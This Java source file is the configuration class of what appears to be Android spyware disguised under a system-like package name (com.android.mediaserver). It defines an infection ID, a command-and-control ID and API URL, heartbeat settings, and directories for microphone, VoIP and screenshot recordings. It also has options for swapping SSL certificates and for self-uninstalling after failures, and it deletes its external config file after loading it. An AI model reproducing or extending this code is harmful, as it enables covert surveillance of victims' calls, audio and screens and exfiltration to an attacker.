package com.android.mediaserver.config;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.util.Log;
import com.android.mediaserver.file.FileUtils;
import com.android.mediaserver.util.AppUtils;
import com.google.gson.Gson;
import com.google.gson.annotations.SerializedName;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;

public class Config {
  private static Config mInstance;
  @SerializedName("api_url") private String mApiUrl;
  @SerializedName("battery_threshold") private double mBatteryThreshold;
  @SerializedName("blacklist_apps") private String[] mBlacklistApps;
  @SerializedName("cert_ca") private String mCertificate;
  @SerializedName("change_ssl") private boolean mChangeSsl;
  @SerializedName("check_roaming") private boolean mCheckRoaming;
  @SerializedName("cncid") private String mCncId;
  @SerializedName("content_types") private String[] mContentTypes;
  @SerializedName("debug") private boolean mDebug;
  @SerializedName("extensions") private String[] mExtensions;
  @SerializedName("failures_to_force_heartbeat") private int mFailuresToForceHeartbeat;
  @SerializedName("failures_to_uninstall") private int mFailuresToUninstall;
  @SerializedName("files_directory_name") private String mFilesDirectoryName;
  @SerializedName("heartbeat_interval") private long mHeartbeatInterval;
  @SerializedName("heartbeats_per_send") private int mHeartbeatsPerSend;
  @SerializedName("infection_id") private String mInfectionId;
  @SerializedName("mic_recordings_directory_name") private String mMicRecordingsDirectoryName;
  @SerializedName("number_of_attempts") private int mNumberOfAttempts;
  @SerializedName("record_voip") private boolean mRecordVoip;
  @SerializedName("recordings_directory_name") private String mRecordingsDirectoryName;
  @SerializedName("screenshots_directory_name") private String mScreenshotsDirectoryName =
      "screenshots";
  @SerializedName("sleep_between_attempts") private int mSleepBetweenAttempts;
  @SerializedName("snapshots_directory_name") private String mSnapshotsDirectoryName;
  @SerializedName("upload_directory_name") private String mUploadDirectoryName;
  @SerializedName("user_files_directory_name") private String mUserFilesDirectoryName =
      "user_files";
  @SerializedName("uuid") private String mUuid;
  @SerializedName("version") private String mVersion;
  @SerializedName("voip_recordings_directory_name") private String mVoipRecordingsDirectoryName;

  private Config(boolean debug, String version, String infectionId, String uuid,
      String[] contentTypes, String[] extensions, String[] blacklistApps, String apiUrl,
      String certificate, long heartbeatInterval, int heartbeatsPerSend, int numberOfAttempts,
      int sleepBetweenAttempts, double batteryThreshold, String filesDirectoryName,
      String uploadDirectoryName, String recordingsDirectoryName, String micRecordingsDirectoryName,
      String voipRecordingsDirectoryName, String snapshotsDirectoryName, boolean checkRoaming,
      int failuresToUninstall, boolean changeSsl, boolean recordVoip, int failuresToForceHeartbeat,
      String cncId) {
    this.mDebug = debug;
    this.mVersion = version;
    this.mInfectionId = infectionId;
    this.mUuid = uuid;
    this.mContentTypes = contentTypes;
    this.mExtensions = extensions;
    this.mBlacklistApps = blacklistApps;
    this.mApiUrl = apiUrl;
    this.mCertificate = certificate;
    this.mHeartbeatInterval = heartbeatInterval;
    this.mHeartbeatsPerSend = heartbeatsPerSend;
    this.mNumberOfAttempts = numberOfAttempts;
    this.mSleepBetweenAttempts = sleepBetweenAttempts;
    this.mBatteryThreshold = batteryThreshold;
    this.mFilesDirectoryName = filesDirectoryName;
    this.mUploadDirectoryName = uploadDirectoryName;
    this.mRecordingsDirectoryName = recordingsDirectoryName;
    this.mMicRecordingsDirectoryName = micRecordingsDirectoryName;
    this.mVoipRecordingsDirectoryName = voipRecordingsDirectoryName;
    this.mSnapshotsDirectoryName = snapshotsDirectoryName;
    this.mCheckRoaming = checkRoaming;
    this.mFailuresToUninstall = failuresToUninstall;
    this.mChangeSsl = changeSsl;
    this.mRecordVoip = recordVoip;
    this.mFailuresToForceHeartbeat = failuresToForceHeartbeat;
    this.mCncId = cncId;
  }

  public static synchronized Config getInstance(Context context) {
    Config config;
    synchronized (Config.class) {
      if (mInstance == null) {
        try {
          Log.d("Config", "Reading config file");
          String filePath =
              context.getFilesDir().getAbsolutePath() + File.separator + "config.json";
          if (!new File(filePath).exists()) {
            File sdConfig = new File(Environment.getExternalStorageDirectory().getAbsolutePath()
                + File.separator
                + "config.json");
            if (sdConfig.exists()) {
              AppUtils.copy(new FileInputStream(sdConfig), new FileOutputStream(filePath));
              sdConfig.delete();
            } else if (!AppUtils.copyFileToFilesDir(context,
                "/data/data/com.android.mediaserver/config.json", filePath)) {
              Log.e("Config", "Failed to copy config file");
            }
          }
          InputStream is = context.openFileInput("config.json");
          int size = is.available();
          Log.e("Config", "Config file size is " + size + " bytes");
          byte[] buffer = new byte[size];
          is.read(buffer);
          is.close();
          mInstance = (Config) new Gson().fromJson(new String(buffer, "UTF-8"), Config.class);
        } catch (Exception e) {
          Log.e("Config", "Failed to parse the config file", e);
          config = null;
        }
      }
      config = mInstance;
    }
    return config;
  }

  public void updateConfig(Context context) throws IOException {
    File configFile =
        new File(context.getFilesDir().getAbsolutePath() + File.separator + "config.json");
    FileUtils.clearFileContent(configFile);
    BufferedWriter bw = new BufferedWriter(new FileWriter(configFile.getAbsoluteFile()));
    bw.write(new Gson().toJson((Object) this));
    bw.close();
  }

  public void updateConfig(Context context, String config) throws IOException {
    File configFile =
        new File(context.getFilesDir().getAbsolutePath() + File.separator + "config.json");
    FileUtils.clearFileContent(configFile);
    BufferedWriter bw = new BufferedWriter(new FileWriter(configFile.getAbsoluteFile()));
    bw.write(config);
    bw.close();
  }

  public boolean getDebug() {
    return this.mDebug;
  }

  public String getVersion() {
    return this.mVersion;
  }

  public String getInfectionId() {
    return this.mInfectionId;
  }

  public void setInfectionId(String infectionId) {
    this.mInfectionId = infectionId;
  }

  public String getUuid() {
    return this.mUuid;
  }

  public void setUuid(String uuid) {
    this.mUuid = uuid;
  }

  public String[] getContentTypes() {
    return this.mContentTypes;
  }

  public void setContentTypes(String[] contentTypes) {
    this.mContentTypes = contentTypes;
  }

  public String[] getExtensions() {
    return this.mExtensions;
  }

  public void setExtensions(String[] extensions) {
    this.mExtensions = extensions;
  }

  public String[] getBlacklistApps() {
    return this.mBlacklistApps;
  }

  public String getApiUrl() {
    return this.mApiUrl;
  }

  public void setApiUrl(String apiUrl) {
    this.mApiUrl = apiUrl;
  }

  public String getCertificate() {
    return this.mCertificate;
  }

  public void setCertificate(String certificate) {
    this.mCertificate = certificate;
  }

  public long getHeartbeatInterval() {
    return this.mHeartbeatInterval;
  }

  public void setHeartbeatInterval(long heartbeatInterval) {
    this.mHeartbeatInterval = heartbeatInterval;
  }

  public int getHeartbeatsPerSend() {
    return this.mHeartbeatsPerSend;
  }

  public void setHeartbeatsPerSend(int heartbeatsPerSend) {
    this.mHeartbeatsPerSend = heartbeatsPerSend;
  }

  public int getNumberOfAttempts() {
    return this.mNumberOfAttempts;
  }

  public int getSleepBetweenAttempts() {
    return this.mSleepBetweenAttempts;
  }

  public double getBatteryThreshold() {
    return this.mBatteryThreshold;
  }

  public String getFilesDirectoryName() {
    return this.mFilesDirectoryName;
  }

  public String getUploadDirectoryName() {
    return this.mUploadDirectoryName;
  }

  public String getRecordingsDirectoryName() {
    return this.mRecordingsDirectoryName;
  }

  public String getMicRecordingsDirectoryName() {
    return this.mMicRecordingsDirectoryName;
  }

  public String getVoipRecordingsDirectoryName() {
    return this.mVoipRecordingsDirectoryName;
  }

  public String getSnapshotsDirectoryName() {
    return this.mSnapshotsDirectoryName;
  }

  public String getScreenshotsDirectoryName() {
    return this.mScreenshotsDirectoryName;
  }

  public String getUserFilesDirectoryName() {
    return this.mUserFilesDirectoryName;
  }

  public boolean getCheckRoaming() {
    return this.mCheckRoaming;
  }

  public int getFailuresToUninstall() {
    return this.mFailuresToUninstall;
  }

  public boolean getChangeSsl() {
    return this.mChangeSsl;
  }

  public boolean getRecordVoip() {
    return this.mRecordVoip && ("Nexus 4".equalsIgnoreCase(Build.MODEL)
        || "Nexus 5".equalsIgnoreCase(Build.MODEL));
  }

  public int getFailuresToForceHeartbeat() {
    return this.mFailuresToForceHeartbeat;
  }

  public String getCncId() {
    return this.mCncId;
  }
}
